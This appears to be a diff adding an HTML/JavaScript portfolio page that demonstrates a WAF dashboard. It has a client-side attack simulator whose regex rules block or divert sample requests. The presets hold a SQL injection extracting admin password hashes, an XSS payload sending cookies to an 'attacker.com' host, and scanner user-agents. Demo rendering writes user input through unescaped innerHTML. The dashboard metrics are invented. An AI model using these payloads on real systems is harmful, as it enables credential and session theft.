@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Zero-Trust Cloud Edge & Intelligent WAF Mesh | SOC Defense Console</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-dark: #0a0e17;
+      --card-bg: rgba(16, 24, 39, 0.85);
+      --card-border: rgba(56, 189, 248, 0.2);
+      --primary: #38bdf8;
+      --primary-glow: rgba(56, 189, 248, 0.35);
+      --success: #10b981;
+      --warning: #f59e0b;
+      --danger: #ef4444;
+      --purple: #a855f7;
+      --text-main: #f1f5f9;
+      --text-dim: #94a3b8;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg-dark);
+      background-image: radial-gradient(circle at 50% 0%, rgba(56, 189, 248, 0.12) 0%, transparent 60%);
+      color: var(--text-main);
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      background: rgba(10, 14, 23, 0.95);
+      border-bottom: 1px solid var(--card-border);
+      padding: 1.25rem 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      backdrop-filter: blur(12px);
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 0.85rem;
+    }
+
+    .shield-badge {
+      background: linear-gradient(135deg, #0284c7, #38bdf8);
+      width: 42px;
+      height: 42px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 20px var(--primary-glow);
+    }
+
+    .brand h1 {
+      font-size: 1.25rem;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+    }
+
+    .brand p {
+      font-size: 0.75rem;
+      color: var(--text-dim);
+      font-family: 'Fira Code', monospace;
+    }
+
+    .header-links a {
+      color: var(--text-dim);
+      text-decoration: none;
+      font-size: 0.85rem;
+      margin-left: 1.5rem;
+      padding: 0.4rem 0.85rem;
+      border-radius: 6px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      transition: all 0.2s;
+    }
+
+    .header-links a:hover {
+      color: var(--primary);
+      border-color: var(--primary);
+      box-shadow: 0 0 12px var(--primary-glow);
+    }
+
+    main {
+      flex: 1;
+      padding: 2rem;
+      max-width: 1400px;
+      margin: 0 auto;
+      width: 100%;
+      display: grid;
+      grid-template-columns: 2fr 1fr;
+      gap: 2rem;
+    }
+
+    .metrics-bar {
+      grid-column: 1 / -1;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 1.25rem;
+    }
+
+    .metric-card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 12px;
+      padding: 1.25rem;
+      backdrop-filter: blur(8px);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .metric-card::after {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 2px;
+      background: var(--primary);
+    }
+
+    .metric-card.danger::after { background: var(--danger); }
+    .metric-card.warning::after { background: var(--warning); }
+    .metric-card.purple::after { background: var(--purple); }
+    .metric-card.success::after { background: var(--success); }
+
+    .metric-title {
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--text-dim);
+      margin-bottom: 0.4rem;
+    }
+
+    .metric-value {
+      font-size: 1.85rem;
+      font-weight: 800;
+      font-family: 'Fira Code', monospace;
+    }
+
+    .metric-sub {
+      font-size: 0.75rem;
+      color: var(--text-dim);
+      margin-top: 0.25rem;
+    }
+
+    .panel {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 14px;
+      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+      backdrop-filter: blur(10px);
+    }
+
+    .panel-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      padding-bottom: 0.85rem;
+    }
+
+    .panel-title {
+      font-size: 1rem;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    /* Threat Map Canvas */
+    .map-container {
+      position: relative;
+      background: #06090f;
+      border-radius: 10px;
+      height: 340px;
+      overflow: hidden;
+      border: 1px solid rgba(56, 189, 248, 0.15);
+    }
+
+    canvas#threatMap {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+
+    /* Attack Feed Table */
+    .table-container {
+      overflow-x: auto;
+      max-height: 280px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.8rem;
+    }
+
+    th {
+      text-align: left;
+      padding: 0.65rem 0.85rem;
+      color: var(--text-dim);
+      font-weight: 600;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      font-family: 'Fira Code', monospace;
+    }
+
+    td {
+      padding: 0.65rem 0.85rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+      font-family: 'Fira Code', monospace;
+    }
+
+    .pill {
+      display: inline-block;
+      padding: 0.2rem 0.55rem;
+      border-radius: 4px;
+      font-size: 0.7rem;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+
+    .pill.block { background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.4); }
+    .pill.allow { background: rgba(16, 185, 129, 0.2); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.4); }
+    .pill.challenge { background: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.4); }
+    .pill.honeypot { background: rgba(168, 85, 247, 0.2); color: #c084fc; border: 1px solid rgba(168, 85, 247, 0.4); }
+
+    /* Interactive Simulator */
+    .simulator-form {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+
+    .preset-selector {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+    }
+
+    .preset-btn {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: var(--text-dim);
+      padding: 0.35rem 0.75rem;
+      border-radius: 6px;
+      font-size: 0.75rem;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .preset-btn:hover, .preset-btn.active {
+      background: rgba(56, 189, 248, 0.15);
+      color: var(--primary);
+      border-color: var(--primary);
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 0.35rem;
+    }
+
+    .form-group label {
+      font-size: 0.75rem;
+      color: var(--text-dim);
+      font-family: 'Fira Code', monospace;
+    }
+
+    .form-input {
+      background: #06090f;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 8px;
+      padding: 0.65rem 0.85rem;
+      color: var(--text-main);
+      font-family: 'Fira Code', monospace;
+      font-size: 0.85rem;
+      outline: none;
+      transition: border 0.2s;
+    }
+
+    .form-input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 10px var(--primary-glow);
+    }
+
+    .btn-fire {
+      background: linear-gradient(135deg, #0284c7, #38bdf8);
+      color: #03111e;
+      border: none;
+      border-radius: 8px;
+      padding: 0.85rem;
+      font-weight: 700;
+      font-size: 0.9rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      transition: all 0.2s;
+    }
+
+    .btn-fire:hover {
+      box-shadow: 0 0 20px var(--primary-glow);
+      transform: translateY(-1px);
+    }
+
+    .result-box {
+      background: #06090f;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      padding: 1rem;
+      display: none;
+    }
+
+    .result-box.active { display: block; }
+
+    footer {
+      text-align: center;
+      padding: 2rem;
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+      font-size: 0.8rem;
+      color: var(--text-dim);
+    }
+
+    footer a { color: var(--primary); text-decoration: none; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="brand">
+      <div class="shield-badge">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#04121d" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        </svg>
+      </div>
+      <div>
+        <h1>Zero-Trust Edge & Intelligent WAF Mesh</h1>
+        <p>AWS CloudFront CDN + WAFv2 + Lambda@Edge Defense Matrix</p>
+      </div>
+    </div>
+    <div class="header-links">
+      <a href="https://github.com/KoshaG0hil/Zero-Trust-Cloud-Edge-WAF-Mesh" target="_blank">View GitHub Repo</a>
+      <a href="https://github.com/KoshaG0hil" target="_blank">Kosha Gohil Portfolio</a>
+    </div>
+  </header>
+
+  <main>
+    <!-- Top KPI Metrics -->
+    <div class="metrics-bar">
+      <div class="metric-card">
+        <div class="metric-title">Inbound Requests (24h)</div>
+        <div class="metric-value" id="kpiTotal">1,482,900</div>
+        <div class="metric-sub">CloudFront Edge Ingress</div>
+      </div>
+      <div class="metric-card danger">
+        <div class="metric-title">Threats Hard Blocked</div>
+        <div class="metric-value" id="kpiBlocked" style="color: var(--danger)">42,108</div>
+        <div class="metric-sub">SQLi, XSS & Rogue Bots</div>
+      </div>
+      <div class="metric-card warning">
+        <div class="metric-title">CAPTCHA Challenges</div>
+        <div class="metric-value" id="kpiChallenged" style="color: var(--warning)">3,842</div>
+        <div class="metric-sub">Rate & Suspicious Velocity</div>
+      </div>
+      <div class="metric-card purple">
+        <div class="metric-title">Honeypot Sandboxed</div>
+        <div class="metric-value" id="kpiDiverted" style="color: var(--purple)">1,295</div>
+        <div class="metric-sub">Decoy Canary Origins</div>
+      </div>
+      <div class="metric-card success">
+        <div class="metric-title">Mean Edge Overhead</div>
+        <div class="metric-value" id="kpiLatency" style="color: var(--success)">1.28 ms</div>
+        <div class="metric-sub">Lambda@Edge Latency</div>
+      </div>
+    </div>
+
+    <!-- Left Column: Threat Map & Live Telemetry -->
+    <div style="display: flex; flex-direction: column; gap: 2rem;">
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <span style="display:inline-block; width:8px; height:8px; background:var(--danger); border-radius:50%; box-shadow: 0 0 8px var(--danger);"></span>
+            Live Global Edge Threat Map & PoP Mitigation Mesh
+          </div>
+          <span style="font-size:0.75rem; color:var(--text-dim); font-family:'Fira Code', monospace;">PoPs: IAD • FRA • NRT • LHR • SYD</span>
+        </div>
+        <div class="map-container">
+          <canvas id="threatMap"></canvas>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">Real-Time Edge Decision Telemetry Feed</div>
+          <span class="pill allow" id="feedStatus">STREAM ACTIVE</span>
+        </div>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Timestamp</th>
+                <th>Client IP</th>
+                <th>Target Endpoint</th>
+                <th>Geo</th>
+                <th>Risk Score</th>
+                <th>Mitigation Action</th>
+              </tr>
+            </thead>
+            <tbody id="telemetryFeedBody">
+              <!-- Dynamically populated -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- Right Column: Interactive Attack Simulator -->
+    <div style="display: flex; flex-direction: column; gap: 2rem;">
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+            </svg>
+            Interactive Attack Simulator
+          </div>
+        </div>
+
+        <p style="font-size: 0.8rem; color: var(--text-dim);">
+          Select an attack payload or customize parameters to test the Zero-Trust Edge inspection engine in real-time.
+        </p>
+
+        <div class="preset-selector">
+          <button class="preset-btn active" onclick="loadPreset('sqli')">SQL Injection</button>
+          <button class="preset-btn" onclick="loadPreset('xss')">Stored XSS</button>
+          <button class="preset-btn" onclick="loadPreset('bot')">Malicious Bot</button>
+          <button class="preset-btn" onclick="loadPreset('honeypot')">Honeypot Decoy</button>
+          <button class="preset-btn" onclick="loadPreset('sanctioned')">Sanctioned Geo</button>
+          <button class="preset-btn" onclick="loadPreset('clean')">Clean Request</button>
+        </div>
+
+        <form class="simulator-form" onsubmit="executeSimulation(event)">
+          <div class="form-group">
+            <label>TARGET URI PATH</label>
+            <input type="text" id="simUri" class="form-input" value="/api/v1/search?category=books">
+          </div>
+
+          <div class="form-group">
+            <label>CLIENT IP & GEO ORIGIN</label>
+            <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 0.5rem;">
+              <input type="text" id="simIp" class="form-input" value="203.0.113.88">
+              <input type="text" id="simGeo" class="form-input" value="US">
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label>USER-AGENT HEADER</label>
+            <input type="text" id="simUa" class="form-input" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64)">
+          </div>
+
+          <div class="form-group">
+            <label>PAYLOAD / BODY / QUERY</label>
+            <textarea id="simPayload" class="form-input" rows="2" style="resize:vertical;">' UNION SELECT null, username, password_hash FROM admin_users--</textarea>
+          </div>
+
+          <button type="submit" class="btn-fire">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+              <circle cx="12" cy="12" r="10"></circle>
+              <line x1="12" y1="8" x2="12" y2="12"></line>
+              <line x1="12" y1="16" x2="12.01" y2="16"></line>
+            </svg>
+            Evaluate Through Zero-Trust Mesh
+          </button>
+        </form>
+
+        <div id="simResultBox" class="result-box">
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.6rem;">
+            <span style="font-size:0.75rem; color:var(--text-dim); font-family:'Fira Code';">DECISION RESULT</span>
+            <span id="simResultPill" class="pill block">BLOCK</span>
+          </div>
+          <div style="font-size:1.1rem; font-weight:700; margin-bottom:0.25rem;" id="simRiskText">Calculated Risk Score: 100 / 100</div>
+          <div style="font-size:0.75rem; color:var(--text-dim); font-family:'Fira Code';" id="simLatencyText">Latency: 0.038 ms • AWS PoP: us-east-1</div>
+          <div style="font-size:0.8rem; color:#f87171; margin-top:0.5rem;" id="simReasonText">Triggered Rules: SQLI_UNION_SELECT, SQLI_COMMENT</div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <p>Zero-Trust Cloud Edge & Intelligent WAF Bot Defense Mesh • Designed & Built by <a href="https://github.com/KoshaG0hil" target="_blank">Kosha Gohil</a></p>
+    <p style="margin-top: 0.35rem; font-size: 0.75rem;">AWS CloudFront • AWS WAFv2 • Lambda@Edge • Terraform IaC • Python 3.12</p>
+  </footer>
+
+  <script>
+    // Presets
+    const presets = {
+      sqli: {
+        uri: "/api/v1/search?category=books",
+        ip: "203.0.113.88",
+        geo: "US",
+        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        payload: "' UNION SELECT null, username, password_hash FROM admin_users--"
+      },
+      xss: {
+        uri: "/comments/submit",
+        ip: "198.51.100.12",
+        geo: "US",
+        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+        payload: "<script>fetch('https://c2-sink.attacker.com?c=' + document.cookie)<\\/script>"
+      },
+      bot: {
+        uri: "/api/v1/pricing",
+        ip: "185.220.101.4",
+        geo: "NL",
+        ua: "sqlmap/1.7#stable (https://sqlmap.org)",
+        payload: "scan_mode=aggressive"
+      },
+      honeypot: {
+        uri: "/.git/config",
+        ip: "192.0.2.77",
+        geo: "DE",
+        ua: "dirbuster/1.0",
+        payload: ""
+      },
+      sanctioned: {
+        uri: "/portal",
+        ip: "175.45.176.1",
+        geo: "KP",
+        ua: "Mozilla/5.0",
+        payload: ""
+      },
+      clean: {
+        uri: "/products/catalog?page=1",
+        ip: "198.51.100.22",
+        geo: "US",
+        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0",
+        payload: ""
+      }
+    };
+
+    function loadPreset(key) {
+      document.querySelectorAll('.preset-btn').forEach(btn => btn.classList.remove('active'));
+      event.target.classList.add('active');
+      const p = presets[key];
+      document.getElementById('simUri').value = p.uri;
+      document.getElementById('simIp').value = p.ip;
+      document.getElementById('simGeo').value = p.geo;
+      document.getElementById('simUa').value = p.ua;
+      document.getElementById('simPayload').value = p.payload;
+    }
+
+    // Interactive Client-Side Rule Engine
+    function evaluateRequest(uri, ip, geo, ua, payload) {
+      const allText = (uri + " " + payload).toLowerCase();
+      const uaLower = ua.toLowerCase();
+      let matched = [];
+      let score = 0;
+      let action = "ALLOW";
+
+      // 1. SQL Injection
+      if (/union(\s+all)?\s+select/i.test(allText)) { matched.push("SQLI_UNION_SELECT"); score = Math.max(score, 95); }
+      if (/('|")\s*(or|and)\s*('|"|\d)?\s*=\s*('|"|\d)?/i.test(allText)) { matched.push("SQLI_TAUTOLOGY"); score = Math.max(score, 90); }
+      if (/--\s*$/i.test(allText)) { matched.push("SQLI_COMMENT"); score = Math.max(score, 60); }
+
+      // 2. XSS
+      if (/<script[^>]*>/i.test(allText)) { matched.push("XSS_SCRIPT_TAG"); score = Math.max(score, 85); }
+      if (/javascript:/i.test(allText)) { matched.push("XSS_PSEUDO_PROTOCOL"); score = Math.max(score, 85); }
+
+      // 3. Bot Detection
+      if (/sqlmap|nikto|dirbuster|gobuster|wpscan|masscan/i.test(uaLower)) { matched.push("MALICIOUS_BOT_USER_AGENT"); score = Math.max(score, 75); }
+
+      // 4. Honeypot Path
+      if (/\.git|wp-login|actuator|aws-credentials/i.test(uri.toLowerCase())) { matched.push("HONEYPOT_PROBE_ACCESSED"); score = Math.max(score, 100); }
+
+      // 5. Sanctioned Geo
+      if (["KP", "IR", "SY", "CU"].includes(geo.toUpperCase())) { matched.push("SANCTIONED_GEOLOCATION"); score = Math.max(score, 95); }
+
+      // Actions
+      if (score >= 86) {
+        action = matched.includes("HONEYPOT_PROBE_ACCESSED") ? "DIVERT_HONEYPOT" : "BLOCK";
+      } else if (score >= 66) {
+        action = "DIVERT_HONEYPOT";
+      } else if (score >= 26) {
+        action = "CHALLENGE_CAPTCHA";
+      } else {
+        action = "ALLOW";
+      }
+
+      return { score, action, matched };
+    }
+
+    function executeSimulation(e) {
+      e.preventDefault();
+      const uri = document.getElementById('simUri').value;
+      const ip = document.getElementById('simIp').value;
+      const geo = document.getElementById('simGeo').value;
+      const ua = document.getElementById('simUa').value;
+      const payload = document.getElementById('simPayload').value;
+
+      const res = evaluateRequest(uri, ip, geo, ua, payload);
+      const latency = (0.02 + Math.random() * 0.04).toFixed(3);
+
+      const box = document.getElementById('simResultBox');
+      const pill = document.getElementById('simResultPill');
+      const riskText = document.getElementById('simRiskText');
+      const latencyText = document.getElementById('simLatencyText');
+      const reasonText = document.getElementById('simReasonText');
+
+      box.classList.add('active');
+      pill.className = "pill " + (res.action === "BLOCK" ? "block" : res.action === "ALLOW" ? "allow" : res.action === "CHALLENGE_CAPTCHA" ? "challenge" : "honeypot");
+      pill.textContent = res.action;
+
+      riskText.textContent = `Calculated Risk Score: ${res.score} / 100`;
+      riskText.style.color = res.action === "ALLOW" ? "var(--success)" : res.action === "CHALLENGE_CAPTCHA" ? "var(--warning)" : "var(--danger)";
+      latencyText.textContent = `Latency: ${latency} ms • AWS PoP: us-east-1 (CloudFront)`;
+      reasonText.textContent = res.matched.length ? `Triggered Rules: ${res.matched.join(', ')}` : "No threats detected. Request sanitized and forwarded.";
+
+      // Push to live table
+      addFeedEntry(ip, uri, geo, res.score, res.action);
+    }
+
+    // Telemetry Feed Table
+    const feedBody = document.getElementById('telemetryFeedBody');
+    const initialFeed = [
+      { ip: "203.0.113.88", uri: "/api/v1/search", geo: "US", score: 95, action: "BLOCK" },
+      { ip: "198.51.100.12", uri: "/comments/submit", geo: "US", score: 85, action: "BLOCK" },
+      { ip: "185.220.101.4", uri: "/api/v1/pricing", geo: "NL", score: 75, action: "DIVERT_HONEYPOT" },
+      { ip: "198.51.100.99", uri: "/.git/config", geo: "DE", score: 100, action: "DIVERT_HONEYPOT" },
+      { ip: "175.45.176.1", uri: "/portal", geo: "KP", score: 95, action: "BLOCK" },
+      { ip: "198.51.100.22", uri: "/products/catalog", geo: "US", score: 0, action: "ALLOW" },
+    ];
+
+    function addFeedEntry(ip, uri, geo, score, action) {
+      const time = new Date().toLocaleTimeString();
+      const pillClass = action === "BLOCK" ? "block" : action === "ALLOW" ? "allow" : action === "CHALLENGE_CAPTCHA" ? "challenge" : "honeypot";
+      const tr = document.createElement('tr');
+      tr.innerHTML = `
+        <td style="color:var(--text-dim);">${time}</td>
+        <td>${ip}</td>
+        <td style="color:var(--primary);">${uri.length > 25 ? uri.substring(0, 25) + '...' : uri}</td>
+        <td>${geo}</td>
+        <td style="font-weight:700;">${score}/100</td>
+        <td><span class="pill ${pillClass}">${action}</span></td>
+      `;
+      feedBody.insertBefore(tr, feedBody.firstChild);
+      if (feedBody.children.length > 8) {
+        feedBody.removeChild(feedBody.lastChild);
+      }
+    }
+
+    initialFeed.forEach(item => addFeedEntry(item.ip, item.uri, item.geo, item.score, item.action));
+
+    // Threat Map Canvas Animation
+    const canvas = document.getElementById('threatMap');
+    const ctx = canvas.getContext('2d');
+
+    function resizeCanvas() {
+      canvas.width = canvas.parentElement.clientWidth;
+      canvas.height = canvas.parentElement.clientHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    // PoP points (X, Y in normalized 0-1)
+    const pops = [
+      { name: "IAD", x: 0.28, y: 0.38 },
+      { name: "FRA", x: 0.52, y: 0.32 },
+      { name: "LHR", x: 0.48, y: 0.30 },
+      { name: "NRT", x: 0.85, y: 0.40 },
+      { name: "SYD", x: 0.88, y: 0.82 }
+    ];
+
+    let attackBeams = [];
+
+    function spawnAttack() {
+      const originX = Math.random() * canvas.width;
+      const originY = Math.random() * canvas.height;
+      const targetPop = pops[Math.floor(Math.random() * pops.length)];
+      attackBeams.push({
+        x: originX,
+        y: originY,
+        tx: targetPop.x * canvas.width,
+        ty: targetPop.y * canvas.height,
+        progress: 0,
+        color: Math.random() > 0.3 ? '#ef4444' : '#a855f7'
+      });
+    }
+
+    setInterval(spawnAttack, 700);
+
+    function drawMap() {
+      ctx.fillStyle = '#06090f';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      // Subtle Grid
+      ctx.strokeStyle = 'rgba(56, 189, 248, 0.05)';
+      ctx.lineWidth = 1;
+      for (let x = 0; x < canvas.width; x += 40) {
+        ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
+      }
+      for (let y = 0; y < canvas.height; y += 40) {
+        ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke();
+      }
+
+      // Draw PoP Hubs
+      pops.forEach(pop => {
+        const px = pop.x * canvas.width;
+        const py = pop.y * canvas.height;
+
+        ctx.beginPath();
+        ctx.arc(px, py, 6, 0, Math.PI * 2);
+        ctx.fillStyle = '#38bdf8';
+        ctx.fill();
+
+        ctx.beginPath();
+        ctx.arc(px, py, 14, 0, Math.PI * 2);
+        ctx.strokeStyle = 'rgba(56, 189, 248, 0.3)';
+        ctx.stroke();
+
+        ctx.fillStyle = '#94a3b8';
+        ctx.font = '10px "Fira Code"';
+        ctx.fillText(pop.name, px - 10, py - 12);
+      });
+
+      // Animate Beams
+      for (let i = attackBeams.length - 1; i >= 0; i--) {
+        const b = attackBeams[i];
+        b.progress += 0.03;
+        const currX = b.x + (b.tx - b.x) * b.progress;
+        const currY = b.y + (b.ty - b.y) * b.progress;
+
+        ctx.beginPath();
+        ctx.moveTo(b.x, b.y);
+        ctx.lineTo(currX, currY);
+        ctx.strokeStyle = b.color;
+        ctx.lineWidth = 1.5;
+        ctx.stroke();
+
+        ctx.beginPath();
+        ctx.arc(currX, currY, 3, 0, Math.PI * 2);
+        ctx.fillStyle = '#fff';
+        ctx.fill();
+
+        if (b.progress >= 1) {
+          attackBeams.splice(i, 1);
+        }
+      }
+
+      requestAnimationFrame(drawMap);
+    }
+    drawMap();
+  </script>
+</body>
+</html>
